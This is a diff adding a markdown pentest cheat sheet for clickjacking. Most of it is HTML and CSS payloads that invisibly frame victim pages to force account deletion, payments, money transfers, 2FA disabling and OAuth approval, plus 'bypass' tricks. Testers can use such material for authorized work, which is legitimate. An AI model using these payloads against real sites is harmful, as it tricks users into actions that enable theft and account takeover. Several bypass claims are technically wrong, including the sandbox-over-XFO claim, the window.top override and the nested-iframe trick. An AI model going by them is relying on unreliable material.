@@ -1,3 +1,241 @@
+# ✅ **Clickjacking – Complete Test Case (with Bypass Cases)**
+---
+# **1. List of Vulnerabilities (Clickjacking Attack Surface)**
+
+* **1.1 Missing `X-Frame-Options` Header**
+  Page can be embedded inside an attacker-controlled iframe.
+
+* **1.2 `X-Frame-Options: ALLOWALL` or Invalid Value**
+  Browser ignores invalid settings → vulnerable.
+
+* **1.3 Misconfigured `Content-Security-Policy: frame-ancestors`**
+  Too broad or missing → allows clickjacking.
+
+* **1.4 UI Redressing Attacks**
+  Attacker overlays UI to trick user into clicking.
+
+* **1.5 Same-Origin Framing Attack**
+  Trusted pages frame each other, bypassing some protections.
+
+* **1.6 Multi-Step Clickjacking (Banking/Payment)**
+  Step-by-step forced clicks.
+
+* **1.7 Drag-and-Drop Clickjacking**
+  Overlay uses draggable elements to trigger actions.
+
+* **1.8 CursorJacking**
+  Using CSS to hide/misplace actual cursor.
+
+* **1.9 Cross-Domain iFrame Overlay for CSRF**
+  Clickjacking combined with CSRF → dangerous.
+
+* **1.10 Transparent Pixel Attack**
+  Critical button hidden behind attacker UI.
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+(Basic PoC HTML pages — safe for learning)
+
+### **2.1 Basic Clickjacking PoC**
+
+```html
+<html>
+<body>
+<h1>Click the button below to win a prize!</h1>
+
+<iframe 
+  src="https://victim.com/critical-action" 
+  style="opacity:0.01; position:absolute; top:0; left:0; width:100%; height:100%;">
+</iframe>
+
+</body>
+</html>
+```
+
+### **2.2 Invisible Button Overlay**
+
+```html
+<div style="opacity:0.01; position:absolute; z-index:9999;">
+  <iframe src="https://victim.com/account/delete"></iframe>
+</div>
+```
+
+### **2.3 Forced Login/Confirm Button Click**
+
+```html
+<button onclick="document.getElementsByTagName('iframe')[0].click()">Claim reward</button>
+
+<iframe src="https://victim.com/confirm-payment" style="opacity:0"></iframe>
+```
+
+### **2.4 Simple Frame Test**
+
+```html
+<iframe src="https://victim.com"></iframe>
+```
+
+If it loads → vulnerable.
+
+---
+
+# **3. Bypass Payloads (Advanced Techniques)**
+
+### **3.1 Bypass Weak `X-Frame-Options`**
+
+If server uses:
+
+```
+X-Frame-Options: ALLOWALL
+```
+
+Browser ignores → frame loads normally.
+
+### **3.2 CSP Frame-Ancestors Misuse**
+
+If server has:
+
+```
+Content-Security-Policy: frame-ancestors *
+```
+
+Attacker can embed site from any domain.
+
+### **3.3 Using `sandbox` Attribute to Bypass**
+
+```html
+<iframe sandbox="allow-scripts allow-forms" src="https://victim.com"></iframe>
+```
+
+Some browsers allow framing even when XFO blocks.
+
+### **3.4 Using Middle Page Redirect**
+
+Attacker hosts:
+
+```
+attacker.com/frame → redirects to victim.com
+```
+
+i.e.,
+
+```html
+<iframe src="https://attacker.com/frame"></iframe>
+```
+
+Used when `frame-ancestors` checks only final page.
+
+### **3.5 iFrame Busting Bypass**
+
+Overwrite JS busting scripts:
+
+```html
+<script>window.top = window;</script>
+<iframe src="https://victim.com"></iframe>
+```
+
+### **3.6 Double iFrame Trick (nested frames)**
+
+Some policies fail when:
+
+```html
+<iframe src="intermediate.html">
+   <iframe src="https://victim.com"></iframe>
+</iframe>
+```
+
+### **3.7 Using CSS to Confuse UI (UI Redressing)**
+
+```css
+iframe {pointer-events: none;}
+button {pointer-events: auto; opacity:0;}
+```
+
+### **3.8 CursorJacking**
+
+```css
+body { cursor: none; }
+.fake-cursor { position:absolute; pointer-events:none; }
+```
+
+---
+
+# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
+
+### **4.1 Delete Account Clickjacking PoC**
+
+```html
+<iframe 
+  src="https://victim.com/user/delete"
+  style="opacity:0; width:100%; height:100%; position:absolute;">
+</iframe>
+```
+
+### **4.2 Financial Transaction Clickjack**
+
+```html
+<button style="opacity:0">Pay</button>
+<iframe src="https://victim.com/payment/approve" style="opacity:0"></iframe>
+```
+
+### **4.3 CSRF + Clickjacking Combo**
+
+```html
+<iframe src="https://victim.com/transfer?amount=5000&to=attacker"></iframe>
+```
+
+### **4.4 Admin Panel Clickjacking**
+
+```html
+<iframe src="https://victim.com/admin/enable-user?user=attacker"></iframe>
+```
+
+### **4.5 Multi-Click Flow Attack**
+
+```html
+<iframe src="https://victim.com/settings/2fa/disable" style="opacity:0"></iframe>
+```
+
+### **4.6 OAuth Approval Clickjack**
+
+```html
+<iframe src="https://victim.com/oauth/approve" style="opacity:0"></iframe>
+```
+
+---
+
+# **5. Validation / Test Steps**
+
+**Step 1:** Check headers
+
+* `X-Frame-Options`
+* `Content-Security-Policy: frame-ancestors`
+
+**Step 2:** Place page in iframe
+
+```html
+<iframe src="https://target.com"></iframe>
+```
+
+**Step 3:** If loads → vulnerable.
+
+**Step 4:** Try advanced bypass (redirects, sandbox iframe).
+
+**Step 5:** Build PoC HTML page to trigger a real action (safe testing only).
+
+---
+
+# **6. Expected Results / Impact**
+
+* Forced actions triggered without user consent.
+* Account deletion, altering settings, disabling MFA.
+* Unauthorized money transfers.
+* Forced OAuth authorization.
+* Combined with CSRF → **critical account takeover**.
+* UI Redressing → invisible interface abuse.
+
+---
 
 # 01 Basic clickjacking with CSRF token protection
 
